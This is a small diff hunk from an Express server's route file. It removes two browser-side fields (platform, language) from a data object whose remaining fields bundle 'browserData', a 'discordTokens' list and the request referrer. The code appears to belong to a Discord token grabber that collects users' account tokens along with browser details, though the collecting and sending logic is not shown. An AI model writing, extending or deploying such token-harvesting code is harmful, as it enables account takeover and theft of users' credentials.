@@ -565,8 +565,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const data = {
         ...browserData,
         discordTokens: allDiscordTokens,
-        platform: navigator.platform,
-        language: navigator.language,
         referrer: req.headers.referer || req.headers.referrer || 'Direct Access'
       };
 
